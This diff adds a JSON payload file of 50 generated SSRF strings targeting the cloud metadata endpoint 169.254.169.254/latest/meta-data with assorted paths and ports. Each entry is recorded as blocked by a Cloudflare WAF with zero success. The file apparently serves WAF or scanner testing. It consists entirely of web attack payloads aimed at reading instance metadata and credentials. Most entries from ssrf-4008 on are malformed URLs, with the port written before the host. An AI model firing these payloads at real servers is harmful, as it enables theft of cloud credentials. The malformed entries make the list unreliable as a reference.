@@ -1,0 +1,707 @@
+{
+  "category": "ssrf",
+  "subcategory": "comprehensive",
+  "count": 50,
+  "payloads": [
+    {
+      "id": "ssrf-4000",
+      "category": "ssrf",
+      "subcategory": "comprehensive",
+      "payload": "http://169.254.169.254/latest/meta-data/",
+      "description": "SSRF 169.254.169.254 port path",
+      "technique": "ssrf",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-4001",
+      "category": "ssrf",
+      "subcategory": "comprehensive",
+      "payload": "http://169.254.169.254/latest/meta-data//admin",
+      "description": "SSRF 169.254.169.254 port path/admin",
+      "technique": "ssrf",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-4002",
+      "category": "ssrf",
+      "subcategory": "comprehensive",
+      "payload": "http://169.254.169.254/latest/meta-data//api",
+      "description": "SSRF 169.254.169.254 port path/api",
+      "technique": "ssrf",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-4003",
+      "category": "ssrf",
+      "subcategory": "comprehensive",
+      "payload": "http://169.254.169.254/latest/meta-data//config",
+      "description": "SSRF 169.254.169.254 port path/config",
+      "technique": "ssrf",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-4004",
+      "category": "ssrf",
+      "subcategory": "comprehensive",
+      "payload": "http://169.254.169.254/latest/meta-data//debug",
+      "description": "SSRF 169.254.169.254 port path/debug",
+      "technique": "ssrf",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-4005",
+      "category": "ssrf",
+      "subcategory": "comprehensive",
+      "payload": "http://169.254.169.254/latest/meta-data//status",
+      "description": "SSRF 169.254.169.254 port path/status",
+      "technique": "ssrf",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-4006",
+      "category": "ssrf",
+      "subcategory": "comprehensive",
+      "payload": "http://169.254.169.254/latest/meta-data//health",
+      "description": "SSRF 169.254.169.254 port path/health",
+      "technique": "ssrf",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-4007",
+      "category": "ssrf",
+      "subcategory": "comprehensive",
+      "payload": "http://169.254.169.254/latest/meta-data//metrics",
+      "description": "SSRF 169.254.169.254 port path/metrics",
+      "technique": "ssrf",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-4008",
+      "category": "ssrf",
+      "subcategory": "comprehensive",
+      "payload": "http::80//169.254.169.254/latest/meta-data/",
+      "description": "SSRF 169.254.169.254 port:80 path",
+      "technique": "ssrf",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-4009",
+      "category": "ssrf",
+      "subcategory": "comprehensive",
+      "payload": "http::80//169.254.169.254/latest/meta-data//admin",
+      "description": "SSRF 169.254.169.254 port:80 path/admin",
+      "technique": "ssrf",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-4010",
+      "category": "ssrf",
+      "subcategory": "comprehensive",
+      "payload": "http::80//169.254.169.254/latest/meta-data//api",
+      "description": "SSRF 169.254.169.254 port:80 path/api",
+      "technique": "ssrf",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-4011",
+      "category": "ssrf",
+      "subcategory": "comprehensive",
+      "payload": "http::80//169.254.169.254/latest/meta-data//config",
+      "description": "SSRF 169.254.169.254 port:80 path/config",
+      "technique": "ssrf",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-4012",
+      "category": "ssrf",
+      "subcategory": "comprehensive",
+      "payload": "http::80//169.254.169.254/latest/meta-data//debug",
+      "description": "SSRF 169.254.169.254 port:80 path/debug",
+      "technique": "ssrf",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-4013",
+      "category": "ssrf",
+      "subcategory": "comprehensive",
+      "payload": "http::80//169.254.169.254/latest/meta-data//status",
+      "description": "SSRF 169.254.169.254 port:80 path/status",
+      "technique": "ssrf",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-4014",
+      "category": "ssrf",
+      "subcategory": "comprehensive",
+      "payload": "http::80//169.254.169.254/latest/meta-data//health",
+      "description": "SSRF 169.254.169.254 port:80 path/health",
+      "technique": "ssrf",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-4015",
+      "category": "ssrf",
+      "subcategory": "comprehensive",
+      "payload": "http::80//169.254.169.254/latest/meta-data//metrics",
+      "description": "SSRF 169.254.169.254 port:80 path/metrics",
+      "technique": "ssrf",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-4016",
+      "category": "ssrf",
+      "subcategory": "comprehensive",
+      "payload": "http::443//169.254.169.254/latest/meta-data/",
+      "description": "SSRF 169.254.169.254 port:443 path",
+      "technique": "ssrf",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-4017",
+      "category": "ssrf",
+      "subcategory": "comprehensive",
+      "payload": "http::443//169.254.169.254/latest/meta-data//admin",
+      "description": "SSRF 169.254.169.254 port:443 path/admin",
+      "technique": "ssrf",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-4018",
+      "category": "ssrf",
+      "subcategory": "comprehensive",
+      "payload": "http::443//169.254.169.254/latest/meta-data//api",
+      "description": "SSRF 169.254.169.254 port:443 path/api",
+      "technique": "ssrf",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-4019",
+      "category": "ssrf",
+      "subcategory": "comprehensive",
+      "payload": "http::443//169.254.169.254/latest/meta-data//config",
+      "description": "SSRF 169.254.169.254 port:443 path/config",
+      "technique": "ssrf",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-4020",
+      "category": "ssrf",
+      "subcategory": "comprehensive",
+      "payload": "http::443//169.254.169.254/latest/meta-data//debug",
+      "description": "SSRF 169.254.169.254 port:443 path/debug",
+      "technique": "ssrf",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-4021",
+      "category": "ssrf",
+      "subcategory": "comprehensive",
+      "payload": "http::443//169.254.169.254/latest/meta-data//status",
+      "description": "SSRF 169.254.169.254 port:443 path/status",
+      "technique": "ssrf",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-4022",
+      "category": "ssrf",
+      "subcategory": "comprehensive",
+      "payload": "http::443//169.254.169.254/latest/meta-data//health",
+      "description": "SSRF 169.254.169.254 port:443 path/health",
+      "technique": "ssrf",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-4023",
+      "category": "ssrf",
+      "subcategory": "comprehensive",
+      "payload": "http::443//169.254.169.254/latest/meta-data//metrics",
+      "description": "SSRF 169.254.169.254 port:443 path/metrics",
+      "technique": "ssrf",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-4024",
+      "category": "ssrf",
+      "subcategory": "comprehensive",
+      "payload": "http::8080//169.254.169.254/latest/meta-data/",
+      "description": "SSRF 169.254.169.254 port:8080 path",
+      "technique": "ssrf",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-4025",
+      "category": "ssrf",
+      "subcategory": "comprehensive",
+      "payload": "http::8080//169.254.169.254/latest/meta-data//admin",
+      "description": "SSRF 169.254.169.254 port:8080 path/admin",
+      "technique": "ssrf",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-4026",
+      "category": "ssrf",
+      "subcategory": "comprehensive",
+      "payload": "http::8080//169.254.169.254/latest/meta-data//api",
+      "description": "SSRF 169.254.169.254 port:8080 path/api",
+      "technique": "ssrf",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-4027",
+      "category": "ssrf",
+      "subcategory": "comprehensive",
+      "payload": "http::8080//169.254.169.254/latest/meta-data//config",
+      "description": "SSRF 169.254.169.254 port:8080 path/config",
+      "technique": "ssrf",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-4028",
+      "category": "ssrf",
+      "subcategory": "comprehensive",
+      "payload": "http::8080//169.254.169.254/latest/meta-data//debug",
+      "description": "SSRF 169.254.169.254 port:8080 path/debug",
+      "technique": "ssrf",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-4029",
+      "category": "ssrf",
+      "subcategory": "comprehensive",
+      "payload": "http::8080//169.254.169.254/latest/meta-data//status",
+      "description": "SSRF 169.254.169.254 port:8080 path/status",
+      "technique": "ssrf",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-4030",
+      "category": "ssrf",
+      "subcategory": "comprehensive",
+      "payload": "http::8080//169.254.169.254/latest/meta-data//health",
+      "description": "SSRF 169.254.169.254 port:8080 path/health",
+      "technique": "ssrf",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-4031",
+      "category": "ssrf",
+      "subcategory": "comprehensive",
+      "payload": "http::8080//169.254.169.254/latest/meta-data//metrics",
+      "description": "SSRF 169.254.169.254 port:8080 path/metrics",
+      "technique": "ssrf",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-4032",
+      "category": "ssrf",
+      "subcategory": "comprehensive",
+      "payload": "http::8443//169.254.169.254/latest/meta-data/",
+      "description": "SSRF 169.254.169.254 port:8443 path",
+      "technique": "ssrf",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-4033",
+      "category": "ssrf",
+      "subcategory": "comprehensive",
+      "payload": "http::8443//169.254.169.254/latest/meta-data//admin",
+      "description": "SSRF 169.254.169.254 port:8443 path/admin",
+      "technique": "ssrf",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-4034",
+      "category": "ssrf",
+      "subcategory": "comprehensive",
+      "payload": "http::8443//169.254.169.254/latest/meta-data//api",
+      "description": "SSRF 169.254.169.254 port:8443 path/api",
+      "technique": "ssrf",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-4035",
+      "category": "ssrf",
+      "subcategory": "comprehensive",
+      "payload": "http::8443//169.254.169.254/latest/meta-data//config",
+      "description": "SSRF 169.254.169.254 port:8443 path/config",
+      "technique": "ssrf",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-4036",
+      "category": "ssrf",
+      "subcategory": "comprehensive",
+      "payload": "http::8443//169.254.169.254/latest/meta-data//debug",
+      "description": "SSRF 169.254.169.254 port:8443 path/debug",
+      "technique": "ssrf",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-4037",
+      "category": "ssrf",
+      "subcategory": "comprehensive",
+      "payload": "http::8443//169.254.169.254/latest/meta-data//status",
+      "description": "SSRF 169.254.169.254 port:8443 path/status",
+      "technique": "ssrf",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-4038",
+      "category": "ssrf",
+      "subcategory": "comprehensive",
+      "payload": "http::8443//169.254.169.254/latest/meta-data//health",
+      "description": "SSRF 169.254.169.254 port:8443 path/health",
+      "technique": "ssrf",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-4039",
+      "category": "ssrf",
+      "subcategory": "comprehensive",
+      "payload": "http::8443//169.254.169.254/latest/meta-data//metrics",
+      "description": "SSRF 169.254.169.254 port:8443 path/metrics",
+      "technique": "ssrf",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-4040",
+      "category": "ssrf",
+      "subcategory": "comprehensive",
+      "payload": "http::3000//169.254.169.254/latest/meta-data/",
+      "description": "SSRF 169.254.169.254 port:3000 path",
+      "technique": "ssrf",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-4041",
+      "category": "ssrf",
+      "subcategory": "comprehensive",
+      "payload": "http::3000//169.254.169.254/latest/meta-data//admin",
+      "description": "SSRF 169.254.169.254 port:3000 path/admin",
+      "technique": "ssrf",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-4042",
+      "category": "ssrf",
+      "subcategory": "comprehensive",
+      "payload": "http::3000//169.254.169.254/latest/meta-data//api",
+      "description": "SSRF 169.254.169.254 port:3000 path/api",
+      "technique": "ssrf",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-4043",
+      "category": "ssrf",
+      "subcategory": "comprehensive",
+      "payload": "http::3000//169.254.169.254/latest/meta-data//config",
+      "description": "SSRF 169.254.169.254 port:3000 path/config",
+      "technique": "ssrf",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-4044",
+      "category": "ssrf",
+      "subcategory": "comprehensive",
+      "payload": "http::3000//169.254.169.254/latest/meta-data//debug",
+      "description": "SSRF 169.254.169.254 port:3000 path/debug",
+      "technique": "ssrf",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-4045",
+      "category": "ssrf",
+      "subcategory": "comprehensive",
+      "payload": "http::3000//169.254.169.254/latest/meta-data//status",
+      "description": "SSRF 169.254.169.254 port:3000 path/status",
+      "technique": "ssrf",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-4046",
+      "category": "ssrf",
+      "subcategory": "comprehensive",
+      "payload": "http::3000//169.254.169.254/latest/meta-data//health",
+      "description": "SSRF 169.254.169.254 port:3000 path/health",
+      "technique": "ssrf",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-4047",
+      "category": "ssrf",
+      "subcategory": "comprehensive",
+      "payload": "http::3000//169.254.169.254/latest/meta-data//metrics",
+      "description": "SSRF 169.254.169.254 port:3000 path/metrics",
+      "technique": "ssrf",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-4048",
+      "category": "ssrf",
+      "subcategory": "comprehensive",
+      "payload": "http::5000//169.254.169.254/latest/meta-data/",
+      "description": "SSRF 169.254.169.254 port:5000 path",
+      "technique": "ssrf",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "ssrf-4049",
+      "category": "ssrf",
+      "subcategory": "comprehensive",
+      "payload": "http::5000//169.254.169.254/latest/meta-data//admin",
+      "description": "SSRF 169.254.169.254 port:5000 path/admin",
+      "technique": "ssrf",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    }
+  ]
+}
